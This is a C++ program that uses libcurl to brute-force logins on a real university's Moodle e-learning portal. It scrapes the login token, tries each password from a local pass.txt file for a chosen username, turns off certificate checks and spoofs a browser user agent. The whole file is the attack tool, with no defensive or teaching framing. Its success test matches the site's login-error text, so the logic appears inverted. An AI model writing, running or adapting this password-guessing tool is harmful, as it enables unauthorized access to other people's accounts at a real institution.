#include <iostream>
#include <string>
#include <fstream>
#include <limits>
#include <curl/curl.h>

using namespace std;

// Callback function for libcurl to write response data into a string
size_t WriteCallback(void* contents, size_t size, size_t nmemb, string* output) {
    size_t totalSize = size * nmemb;
    output->append((char*)contents, totalSize);
    return totalSize;
}

// Function to extract token from HTML
string extractToken(const string& html) {
    string token;
    size_t pos = html.find("name=\"logintoken\"");
    if (pos != string::npos) {
        // Find the opening tag of the input element
        size_t tagStart = html.rfind("<input", pos);
        if (tagStart != string::npos) {
            // Find the closing tag of the input element
            size_t tagEnd = html.find(">", tagStart);
            if (tagEnd != string::npos) {
                // Extract the input element
                string inputElement = html.substr(tagStart, tagEnd - tagStart + 1);
                // Find the value attribute
                size_t valuePos = inputElement.find("value=\"");
                if (valuePos != string::npos) {
                    valuePos += 7; // length of "value=\"" is 7
                    size_t valueEnd = inputElement.find("\"", valuePos);
                    if (valueEnd != string::npos) {
                        // Extract the value of login token
                        token = inputElement.substr(valuePos, valueEnd - valuePos);
                    }
                }
            }
        }
    }
    return token;
}

// Function to print HTML structure
void printHTML(const string& html) {
    cout << "HTML Structure:" << endl;
    cout << html << endl;
}

bool login(CURL* curl, const string& username, const string& password, const string& token, string& responseData) {
    curl_easy_setopt(curl, CURLOPT_URL, "https://elearning.uad.ac.id/login/index.php");

    string postData = "logintoken=" + token + "&username=" + username + "&password=" + password + "&button=submit";
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postData.c_str());

    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &responseData);

    CURLcode res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << endl;
        return false;
    } else {
        return true;
    }
}

int main() {
    CURL* curl = curl_easy_init();
    if (!curl) {
        cerr << "Error initializing curl." << endl;
        return 1;
    }

    string responseData;
    curl_easy_setopt(curl, CURLOPT_URL, "https://elearning.uad.ac.id/login/");
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &responseData);

    // Set User-Agent string
    curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36");

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        cerr << "curl_easy_perform() failed: " << curl_easy_strerror(res) << endl;
        curl_easy_cleanup(curl);
        return 1;
    }

    // Print HTML structure
    

    // Clearing input buffer
    cin.clear();
    cin.ignore(numeric_limits<streamsize>::max(), '\n');

    string username;
    cout << "Enter your username: ";
    getline(cin, username); // Using getline instead of cin to capture full username with spaces

    ifstream inputFile("pass.txt");
    if (!inputFile.is_open()) {
        cerr << "Failed to open pass.txt" << endl;
        curl_easy_cleanup(curl);
        return 1;
    }

    string password;
    bool success = false;
    while (getline(inputFile, password)) {
        string token = extractToken(responseData);
        if (token.empty()) {
            cerr << "Failed to extract token from HTML." << endl;
            curl_easy_cleanup(curl);
            return 1;
        }
        cout << "Token: " << token << endl;

        responseData.clear();

        if (login(curl, username, password, token, responseData)) {
            if (responseData.find("Kesalahan saat login, silahkan ulang lagi. Mungkin belum terdaftar. username HARUS NIM/NIY/NIP.") != string::npos) {
                cout << "Login berhasil dengan password: " << password << endl;
                success = true;
                break;
            } else {
                cout << "Login gagal dengan password: " << password << endl;
                            	printHTML(responseData);

            }
        } else {
            cerr << "Permintaan gagal dengan password: " << password << endl;
        }
    }

    if (!success) {
        cout << "Gagal login setelah mencoba semua password." << endl;
    }

    // Cleanup
    inputFile.close();
    curl_easy_cleanup(curl);

    return 0;
}

